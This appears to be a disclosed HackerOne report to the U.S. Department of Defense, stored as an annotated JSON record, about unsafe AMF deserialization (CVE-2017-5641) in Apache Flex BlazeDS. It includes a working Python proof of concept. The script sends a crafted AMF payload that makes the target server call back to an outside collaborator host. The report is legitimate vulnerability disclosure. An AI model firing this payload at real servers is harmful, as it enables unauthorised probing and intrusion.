{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "sp1d3rs ",
  "title": "[HTAF4-213] [Pre-submission] Unsafe AMF deserialization (CVE-2017-5641) in Apache Flex BlazeDS at the https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588/daip/messagebroker/amf",
  "content": "\nDescription\nWe identified potential unsafe deserialization vulnerability on the https://www.\u2588\u2588\u2588\u2588\u2588/daip/messagebroker/amf endpoint.\nPOC\nTo exclude false-positive reaction and show that pingback is result of AMF deserialization, and not a reaction to the external host in the POST body, first run this request:\nCode 228 Bytes\n1POST /daip/messagebroker/amf HTTP/1.1\n2Host: www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Connection: close\n4Accept-Encoding: gzip, deflate\n5Accept: */*\n6User-Agent: python-requests/2.22.0\n7Content-Type: application/x-amf\n8Content-Length: 51\n9\n10<your collaborator host>\nNothing will happen. You will receive something like this:\n\u2588\u2588\u2588\nYou can wait few minutes to ensure that nothing is coming.\nNext, send the collaborator host inside the serialized AMF payload using this script, e.g. script.py <collaborator> 80\nCode 706 Bytes\n1import struct\n2import sys\n3import requests\n4 \n5if len(sys.argv) != 3:\n6    print \"Usage: host port\"\n7    quit()\n8 \n9\n10callback_IP = sys.argv[1]\n11callback_port = sys.argv[2]\n12 \n13amf_payload = '\\x00\\x03\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x11\\x0a' + \\\n14              '\\x07\\x33' + 'sun.rmi.server.UnicastRef' + struct.pack('>H', len(callback_IP)) + callback_IP + \\\n15              struct.pack('>I', int(callback_port)) + \\\n16              '\\xf9\\x6a\\x76\\x7b\\x7c\\xde\\x68\\x4f\\x76\\xd8\\xaa\\x3d\\x00\\x00\\x01\\x5b\\xb0\\x4c\\x1d\\x81\\x80\\x01\\x00';\n17 \n18url = \"https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588/daip/messagebroker/amf\"\n19headers = {'Content-Type': 'application/x-amf'}\n20response = requests.post(url, headers=headers, data=amf_payload, verify=False)\nThis will result in the significant delay, and soon you will get the pingback from the \u2588\u2588\u2588/\u2588\u2588\u2588 IP\nThis indicates, that backend server deserialized AMF data and triggered a DNS lookup (there won't be http since sun.rmi.server.UnicastRef doesn't communicate via http).\nSuggested fix\nUpdate Apache Flex BlazeDS library\nImpact\nUnsafe deserialization of AMF data.\nWe will work on this and try to improve impact, if possible.\n\n",
  "severity": [
    10.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Deserialization of Untrusted Data"
  ],
  "screenshots": {},
  "disclosed_date": 1718744640,
  "report_url": "https://hackerone.com/reports/728614",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Send a POST request to the AMF endpoint with a collaborator host in the body to verify no response is received."
    ],
    [
      2,
      "Use the provided Python script to send a specially crafted AMF payload containing the collaborator host, which triggers a DNS lookup indicating unsafe deserialization."
    ]
  ],
  "vuln_description": "The vulnerability involves unsafe deserialization of AMF data in Apache Flex BlazeDS, allowing an attacker to trigger remote code execution or other malicious actions by sending a specially crafted AMF payload to the vulnerable endpoint.",
  "reason": "The attack requires understanding of AMF serialization and the specific payload structure to exploit the deserialization flaw. While the steps are straightforward, crafting the correct payload requires knowledge of the vulnerability and the target system's behavior.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}